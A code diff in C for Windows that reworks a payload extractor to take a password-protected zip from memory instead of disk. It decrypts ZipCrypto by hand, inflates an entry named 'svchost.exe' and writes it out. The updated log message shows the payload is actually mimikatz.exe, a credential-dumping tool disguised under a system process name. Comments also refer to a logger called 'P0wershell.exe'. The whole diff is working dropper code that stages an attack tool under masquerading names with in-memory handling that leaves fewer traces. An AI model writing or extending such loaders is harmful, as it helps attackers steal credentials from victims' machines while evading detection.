@@ -1,19 +1,20 @@
 #include <windows.h>
 #include <stdio.h>
+#include <stdarg.h>
 #include "miniz.h"
 #include "miniz_zip.h"
 #include "payload_extract.h"
 
-/* ponytail: caller supplies its own audit() so this module stays host-agnostic
-   (P0wershell writes C:\ProgramData\...\audit.log, the proxy wrote the same). */
+/* ponytail: caller supplies its own activity() logger so this module stays
+   host-agnostic (P0wershell.exe writes Desktop\activity.log). */
 typedef void (*audit_fn)(const char *fmt, ...);
 audit_fn g_audit_fn = NULL;
 
 /* ponytail: miniz can't decrypt ZipCrypto, so we do it by hand. Steps:
    1) miniz parses the (unencrypted) central dir to locate svchost.exe and get
       its local-header offset + compressed size.
-   2) Seek to the local header, skip it, then ZipCrypto-decrypt the 12-byte
-      encryption header + the encrypted deflate stream.
+   2) Slice the encrypted data out of the in-memory buffer, then ZipCrypto-
+      decrypt the 12-byte encryption header + the encrypted deflate stream.
    3) Raw-inflate the decrypted stream with mz_inflate (no zlib wrapper).
    ZipCrypto is a trivial 3-key CRC32 stream cipher. */
 
@@ -28,72 +29,65 @@ static unsigned char zc_decrypt_byte(mz_ulong k2) {
     return (unsigned char)(((t * (t ^ 1)) >> 8) & 0xFF);
 }
 
-BOOL extract_payload(const char *zipPath, const char *outExe, const char *pw) {
-    extern audit_fn g_audit_fn;
+BOOL extract_payload_mem(const unsigned char *zip, size_t zipLen, const char *outExe, const char *pw) {
     audit_fn audit = g_audit_fn ? g_audit_fn : (audit_fn)printf;
 
     mz_zip_archive z = {0};
-    if (!mz_zip_reader_init_file(&z, zipPath, 0)) {
-        audit("[-] Unzip init failed (corrupt/unsupported zip): %s", zipPath);
+    if (!mz_zip_reader_init_mem(&z, zip, zipLen, 0)) {
+        audit("[-] Unzip init failed (corrupt/unsupported zip)");
         return FALSE;
     }
 
     int idx = mz_zip_reader_locate_file(&z, "svchost.exe", NULL, 0);
     if (idx < 0) {
-        audit("[-] svchost.exe not found in zip: %s", zipPath);
+        audit("[-] svchost.exe not found in zip");
         mz_zip_reader_end(&z);
         return FALSE;
     }
     mz_zip_archive_file_stat st;
     if (!mz_zip_reader_file_stat(&z, (mz_uint)idx, &st)) {
-        audit("[-] zip stat failed: %s", zipPath);
-        mz_zip_reader_end(&z);
-        return FALSE;
-    }
-
-    HANDLE hf = CreateFileA(zipPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (hf == INVALID_HANDLE_VALUE) {
-        audit("[-] cannot reopen zip for decrypt: %s", zipPath);
+        audit("[-] zip stat failed");
         mz_zip_reader_end(&z);
         return FALSE;
     }
 
     /* local header is 30 bytes + filename len + extra len, then enc header (12) + data */
-    DWORD lho = (DWORD)st.m_local_header_ofs;
-    unsigned char lh[30];
-    DWORD got;
-    if (!ReadFile(hf, lh, 30, &got, NULL) || got != 30 || *(unsigned long *)lh != 0x04034b50UL) {
-        audit("[-] bad local header in zip: %s", zipPath);
-        CloseHandle(hf); mz_zip_reader_end(&z); return FALSE;
+    size_t lho = (size_t)st.m_local_header_ofs;
+    if (lho + 30 > zipLen) {
+        audit("[-] bad local header offset in zip");
+        mz_zip_reader_end(&z);
+        return FALSE;
+    }
+    const unsigned char *lh = zip + lho;
+    if (*(unsigned long *)lh != 0x04034b50UL) {
+        audit("[-] bad local header magic in zip");
+        mz_zip_reader_end(&z);
+        return FALSE;
     }
     DWORD fnlen = lh[26] | (lh[27] << 8);
     DWORD exlen = lh[28] | (lh[29] << 8);
-    LARGE_INTEGER li; li.QuadPart = (LONGLONG)lho + 30 + fnlen + exlen;
-    if (!SetFilePointerEx(hf, li, NULL, FILE_BEGIN)) {
-        audit("[-] seek to zip data failed: %s", zipPath);
-        CloseHandle(hf); mz_zip_reader_end(&z); return FALSE;
-    }
-
+    size_t dataOfs = lho + 30 + fnlen + exlen;
     mz_uint64 comp = st.m_comp_size;
-    unsigned char *enc = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)comp + 12);
-    if (!enc) { CloseHandle(hf); mz_zip_reader_end(&z); return FALSE; }
-    if (!ReadFile(hf, enc, (DWORD)(comp + 12), &got, NULL) || (mz_uint64)got != comp + 12) {
-        audit("[-] read encrypted data failed: %s", zipPath);
-        HeapFree(GetProcessHeap(), 0, enc); CloseHandle(hf); mz_zip_reader_end(&z); return FALSE;
+    if (dataOfs + 12 + comp > zipLen) {
+        audit("[-] zip data truncated");
+        mz_zip_reader_end(&z);
+        return FALSE;
     }
-    CloseHandle(hf);
+    const unsigned char *enc = zip + dataOfs;
 
     /* init ZipCrypto keys from password */
     mz_ulong k0 = 0x12345678UL, k1 = 0x23456789UL, k2 = 0x34567890UL;
     for (const char *p = pw; *p; ++p) zc_update_keys(&k0, &k1, &k2, (unsigned char)*p);
-    /* decrypt (in place): skip the 12-byte enc header after advancing keys */
+
+    unsigned char *dec = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)comp + 12);
+    if (!dec) { mz_zip_reader_end(&z); return FALSE; }
+    /* skip the 12-byte enc header after advancing keys, then decrypt the stream */
     for (mz_uint64 i = 0; i < 12; ++i) {
         unsigned char b = (unsigned char)(enc[i] ^ zc_decrypt_byte(k2));
         zc_update_keys(&k0, &k1, &k2, b);
     }
-    unsigned char *dec = enc + 12;
     for (mz_uint64 i = 0; i < comp; ++i) {
-        unsigned char b = (unsigned char)(dec[i] ^ zc_decrypt_byte(k2));
+        unsigned char b = (unsigned char)(enc[12 + i] ^ zc_decrypt_byte(k2));
         zc_update_keys(&k0, &k1, &k2, b);
         dec[i] = b;
     }
@@ -103,7 +97,7 @@ BOOL extract_payload(const char *zipPath, const char *outExe, const char *pw) {
     s.next_in = dec; s.avail_in = (unsigned int)comp;
     mz_ulong outcap = (st.m_uncomp_size && st.m_uncomp_size < 64*1024*1024) ? (mz_ulong)st.m_uncomp_size + 65536 : 16*1024*1024;
     unsigned char *out = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)outcap);
-    if (!out) { HeapFree(GetProcessHeap(), 0, enc); mz_zip_reader_end(&z); return FALSE; }
+    if (!out) { HeapFree(GetProcessHeap(), 0, dec); mz_zip_reader_end(&z); return FALSE; }
     s.next_out = out; s.avail_out = (unsigned int)outcap;
     BOOL ok = FALSE;
     if (mz_inflateInit2(&s, -MZ_DEFAULT_WINDOW_BITS) == MZ_OK) {
@@ -113,20 +107,20 @@ BOOL extract_payload(const char *zipPath, const char *outExe, const char *pw) {
             if (of != INVALID_HANDLE_VALUE) {
                 DWORD w;
                 if (WriteFile(of, out, s.total_out, &w, NULL) && w == s.total_out) ok = TRUE;
-                else audit("[-] write svchost.exe failed (%lu)", GetLastError());
+                else audit("[-] write %s failed (%lu)", outExe, GetLastError());
                 CloseHandle(of);
-            } else audit("[-] create svchost.exe failed (%lu)", GetLastError());
+            } else audit("[-] create %s failed (%lu)", outExe, GetLastError());
         } else audit("[-] inflate failed (%d) bad password?", ir);
     } else audit("[-] inflateInit failed");
 
     HeapFree(GetProcessHeap(), 0, out);
-    HeapFree(GetProcessHeap(), 0, enc);
+    HeapFree(GetProcessHeap(), 0, dec);
     mz_zip_reader_end(&z);
 
     if (ok) {
         DWORD sz = 0; WIN32_FILE_ATTRIBUTE_DATA fa;
         if (GetFileAttributesExA(outExe, GetFileExInfoStandard, &fa)) sz = fa.nFileSizeLow;
-        audit("[+] Extracted svchost.exe (%lu bytes) <- %s", sz, zipPath);
-    } else audit("[-] extraction failed: %s", zipPath);
+        audit("[+] Extracted mimikatz.exe (%lu bytes), decrypted + inflated in-memory", sz);
+    } else audit("[-] extraction failed");
     return ok;
 }
